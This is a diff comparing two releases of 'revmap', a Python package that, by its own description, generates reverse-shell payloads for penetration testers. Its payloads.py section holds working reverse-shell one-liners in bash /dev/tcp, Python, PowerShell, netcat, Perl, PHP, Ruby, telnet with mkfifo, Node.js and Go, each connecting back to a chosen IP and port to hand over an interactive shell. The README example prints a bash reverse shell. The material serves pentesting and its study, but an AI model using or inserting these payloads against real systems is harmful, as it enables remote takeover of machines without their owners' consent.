# Comparing `tmp/revmap-0.0.2.tar.gz` & `tmp/revmap-0.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "revmap-0.0.2.tar", last modified: Wed Mar 15 23:41:20 2023, max compression
+gzip compressed data, was "revmap-0.0.3.tar", last modified: Thu May 25 23:57:21 2023, max compression
```

## Comparing `revmap-0.0.2.tar` & `revmap-0.0.3.tar`

### file list

```diff
@@ -1,22 +1,22 @@
-drwxrwxrwx   0        0        0        0 2023-03-15 23:41:20.386338 revmap-0.0.2/
--rw-rw-rw-   0        0        0     1097 2023-03-12 15:17:42.000000 revmap-0.0.2/LICENSE
--rw-rw-rw-   0        0        0     4259 2023-03-15 23:41:20.385333 revmap-0.0.2/PKG-INFO
--rw-rw-rw-   0        0        0     2891 2023-03-12 22:55:26.000000 revmap-0.0.2/README.md
-drwxrwxrwx   0        0        0        0 2023-03-15 23:41:20.376507 revmap-0.0.2/revmap/
--rw-rw-rw-   0        0        0       72 2023-03-13 02:47:55.000000 revmap-0.0.2/revmap/__init__.py
--rw-rw-rw-   0        0        0       77 2023-03-15 23:34:25.000000 revmap-0.0.2/revmap/__main__.py
--rw-rw-rw-   0        0        0      375 2023-03-15 23:38:39.000000 revmap-0.0.2/revmap/__meta__.py
--rw-rw-rw-   0        0        0      544 2023-03-15 23:32:59.000000 revmap-0.0.2/revmap/encoded.py
--rw-rw-rw-   0        0        0     4022 2023-03-15 23:23:50.000000 revmap-0.0.2/revmap/payloads.py
--rw-rw-rw-   0        0        0     4884 2023-03-13 03:12:30.000000 revmap-0.0.2/revmap/revmap.py
-drwxrwxrwx   0        0        0        0 2023-03-15 23:41:20.382596 revmap-0.0.2/revmap.egg-info/
--rw-rw-rw-   0        0        0     4259 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      336 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       52 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0        2 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/not-zip-safe
--rw-rw-rw-   0        0        0       12 2023-03-15 23:41:20.000000 revmap-0.0.2/revmap.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-03-15 23:41:20.386338 revmap-0.0.2/setup.cfg
--rw-rw-rw-   0        0        0     1893 2023-03-15 23:30:00.000000 revmap-0.0.2/setup.py
-drwxrwxrwx   0        0        0        0 2023-03-15 23:41:20.384109 revmap-0.0.2/test/
--rw-rw-rw-   0        0        0        0 2023-03-13 02:39:05.000000 revmap-0.0.2/test/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/
+-rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-25 23:57:11.000000 revmap-0.0.3/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-25 23:57:21.719035 revmap-0.0.3/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     2813 2023-05-25 23:57:11.000000 revmap-0.0.3/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/revmap/
+-rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      365 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/__meta__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      522 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/encoded.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3922 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/payloads.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4733 2023-05-25 23:57:11.000000 revmap-0.0.3/revmap/revmap.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/revmap.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      336 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       52 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       12 2023-05-25 23:57:21.000000 revmap-0.0.3/revmap.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-25 23:57:21.719035 revmap-0.0.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1838 2023-05-25 23:57:11.000000 revmap-0.0.3/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:21.719035 revmap-0.0.3/test/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-25 23:57:11.000000 revmap-0.0.3/test/__init__.py
```

### Comparing `revmap-0.0.2/LICENSE` & `revmap-0.0.3/LICENSE`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,20 +1,20 @@
-The MIT License (MIT)
-
-Copyright (c) 2023 João Victor
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of
-this software and associated documentation files (the "Software"), to deal in
-the Software without restriction, including without limitation the rights to
-use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
-the Software, and to permit persons to whom the Software is furnished to do so,
-subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
-FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
-COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
-IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+The MIT License (MIT)
+
+Copyright (c) 2023 João Victor
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of
+this software and associated documentation files (the "Software"), to deal in
+the Software without restriction, including without limitation the rights to
+use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
+the Software, and to permit persons to whom the Software is furnished to do so,
+subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```

### Comparing `revmap-0.0.2/PKG-INFO` & `revmap-0.0.3/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,110 +1,110 @@
-Metadata-Version: 2.1
-Name: revmap
-Version: 0.0.2
-Summary: Tool that generates reverse shell in multiple languages and encodes
-Home-page: https://github.com/joaoviictorti/revmap
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: revshell shell python security
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=revmap)](https://git.io/typing-svg)
-
-
-
-<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revmap">Usage</a>
-</p>
-
----
-
-
-O revmap é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revmap é construído para fazer apenas uma coisa: gera payloads reverse shell + encodes e faz isso muito bem.
-
-Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
- - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
-
-# Forma de utilização
-
-```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
-
-options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
-```
-
-# Instalação
-
-revmap requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install revmap
-```
-
-# Executando revmap
-
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: revmap
+Version: 0.0.3
+Summary: Tool that generates reverse shell in multiple languages and encodes
+Home-page: https://github.com/joaoviictorti/revmap
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: revshell shell python security
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=revmap)](https://git.io/typing-svg)
+
+
+
+<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-revmap">Usage</a>
+</p>
+
+---
+
+
+O revmap é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revmap é construído para fazer apenas uma coisa: gera payloads reverse shell + encodes e faz isso muito bem.
+
+Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
+ - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
+
+# Forma de utilização
+
+```sh
+revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
+revmap --ip 192.168.4.80 --port 4444 --payload bash 
+revmap --ip 192.168.4.80 --port 4444 --payload python
+revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+ ___ ___ _ _ _____ ___ ___ 
+|  _| -_| | |     | .'| . |
+|_| |___|\_/|_|_|_|__,|  _|
+                      |_|  
+        v0.0.1 - @joaoviictorti 
+
+options:
+  --h, --help            show this help message and exit
+  --version             show program's version number and exit
+  --ip IP                Insert ip
+  --port PORTA           Insert port
+  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
+  --encode {base64,hex,urlencode} Insert encode
+```
+
+# Instalação
+
+revmap requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install revmap
+```
+
+# Executando revmap
+
+```console
+revmap --ip 192.168.4.160 --port 8080 --payload bash
+
+ ___ ___ _ _ _____ ___ ___ 
+|  _| -_| | |     | .'| . |
+|_| |___|\_/|_|_|_|__,|  _|
+                      |_|  
+        v0.0.1 - @joaoviictorti 
+                                               
+
+bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
+```
+
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.2 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.3 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
```

### Comparing `revmap-0.0.2/revmap/payloads.py` & `revmap-0.0.3/revmap/payloads.py`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,99 +1,99 @@
-from .encoded import Encode
-
-
-class Bash(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = (
-            f"bash -c 'exec bash -i &>/dev/tcp/{self.__ip}/{self.__porta} <&1'"
-        )
-        super().__init__(self.__payload)
-
-
-class Python(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.__ip}",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
-        super().__init__(self.__payload)
-
-
-class Powershell(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = (
-            "$client = New-Object System.Net.Sockets.TCPClient('"
-            + self.__ip
-            + "',"
-            + self.__porta
-            + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-        )
-        super().__init__(self.__payload)
-
-
-class Netcat(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f'nc -vn {self.__ip} {self.__porta} -e "/bin/bash"'
-        super().__init__(self.__payload)
-
-
-class Perl(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = 'perl -e \'use Socket;$i="$ENV{'
-        +self.__ip
-        +'}"+";$p=$ENV{'
-        +self.__porta
-        +'};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-        super().__init__(self.__payload)
-
-
-class PHP(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f'php -r \'$sock=fsockopen(getenv({self.__ip}),getenv({self.__porta}));exec("/bin/sh -i <&3 >&3 2>&3");\''
-        super().__init__(self.__payload)
-
-
-class Ruby(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{self.__ip}",{self.__porta}))\''
-        super().__init__(self.__payload)
-
-
-class Telnet(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f'TF=$(mktemp -u);mkfifo $TF && telnet {self.__ip} {self.__porta} 0<$TF | sh 1>$TF'
-        super().__init__(self.__payload)
-
-
-class NodeJs(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = f"require('child_process').execSync('nc -e sh {self.__ip} {self.__porta}')"
-        super().__init__(self.__payload)
-
-
-class Golang(Encode):
-    def __init__(self: object, ip: str, porta: str):
-        self.__ip = ip
-        self.__porta = porta
-        self.__payload = (
-            'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'
-            + self.__ip
-            + ':'
-            + self.__porta
-            + '");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
-        )
-        super().__init__(self.__payload)
+from .encoded import Encode
+
+
+class Bash(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = (
+            f"bash -c 'exec bash -i &>/dev/tcp/{self.__ip}/{self.__porta} <&1'"
+        )
+        super().__init__(self.__payload)
+
+
+class Python(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.__ip}",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
+        super().__init__(self.__payload)
+
+
+class Powershell(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = (
+            "$client = New-Object System.Net.Sockets.TCPClient('"
+            + self.__ip
+            + "',"
+            + self.__porta
+            + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        )
+        super().__init__(self.__payload)
+
+
+class Netcat(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f'nc -vn {self.__ip} {self.__porta} -e "/bin/bash"'
+        super().__init__(self.__payload)
+
+
+class Perl(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = 'perl -e \'use Socket;$i="$ENV{'
+        +self.__ip
+        +'}"+";$p=$ENV{'
+        +self.__porta
+        +'};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+        super().__init__(self.__payload)
+
+
+class PHP(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f'php -r \'$sock=fsockopen(getenv({self.__ip}),getenv({self.__porta}));exec("/bin/sh -i <&3 >&3 2>&3");\''
+        super().__init__(self.__payload)
+
+
+class Ruby(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{self.__ip}",{self.__porta}))\''
+        super().__init__(self.__payload)
+
+
+class Telnet(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f'TF=$(mktemp -u);mkfifo $TF && telnet {self.__ip} {self.__porta} 0<$TF | sh 1>$TF'
+        super().__init__(self.__payload)
+
+
+class NodeJs(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f"require('child_process').execSync('nc -e sh {self.__ip} {self.__porta}')"
+        super().__init__(self.__payload)
+
+
+class Golang(Encode):
+    def __init__(self: object, ip: str, porta: str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = (
+            'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'
+            + self.__ip
+            + ':'
+            + self.__porta
+            + '");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
+        )
+        super().__init__(self.__payload)
```

### Comparing `revmap-0.0.2/revmap.egg-info/PKG-INFO` & `revmap-0.0.3/revmap.egg-info/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,110 +1,110 @@
-Metadata-Version: 2.1
-Name: revmap
-Version: 0.0.2
-Summary: Tool that generates reverse shell in multiple languages and encodes
-Home-page: https://github.com/joaoviictorti/revmap
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: revshell shell python security
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=revmap)](https://git.io/typing-svg)
-
-
-
-<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revmap">Usage</a>
-</p>
-
----
-
-
-O revmap é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revmap é construído para fazer apenas uma coisa: gera payloads reverse shell + encodes e faz isso muito bem.
-
-Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
- - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
-
-# Forma de utilização
-
-```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
-
-options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
-```
-
-# Instalação
-
-revmap requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install revmap
-```
-
-# Executando revmap
-
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.1 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: revmap
+Version: 0.0.3
+Summary: Tool that generates reverse shell in multiple languages and encodes
+Home-page: https://github.com/joaoviictorti/revmap
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: revshell shell python security
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=revmap)](https://git.io/typing-svg)
+
+
+
+<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-revmap">Usage</a>
+</p>
+
+---
+
+
